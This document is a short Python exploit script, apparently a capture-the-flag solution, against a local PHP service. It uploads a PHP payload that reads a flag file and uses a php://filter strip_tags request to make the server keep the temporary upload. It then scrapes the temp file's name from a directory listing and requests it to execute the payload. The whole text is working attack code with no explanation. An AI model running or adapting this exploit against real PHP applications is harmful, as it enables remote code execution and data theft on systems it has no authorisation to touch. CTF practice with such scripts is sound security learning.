from requests import get, post
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as bs4

HOST = '127.0.0.1'
PORT = 2222
URL = f'http://{HOST}:{PORT}'

def tmp_upload():

    payload = "<?php echo file_get_contents('/var/www/html/flag.txt'); ?>"
    try:
        r = post(
            url = URL + "/dir.php",
            files = {"dummy_filename":("A"*5, payload)},
            params = {
                "mode" : "base64",
                "image" : f"php://filter/string.strip_tags/resource=/var/www/html/assets/css/main.css"
            }
        )
        print(r.text)
    except ConnectionError:
        print("[+] TEMP FILE Upload Success")

def flag(tmp_filename): return get(URL + f"/tmp/{tmp_filename}%3F.php").text

def exploit():

    tmp_upload()
    after = bs4(get(URL + "/dir.php").text, 'html.parser')
    tmp_filename = after.select('ul>li')[-1].text[:3+6] # php(3) + random string(6)

    print(flag(tmp_filename))

exploit()
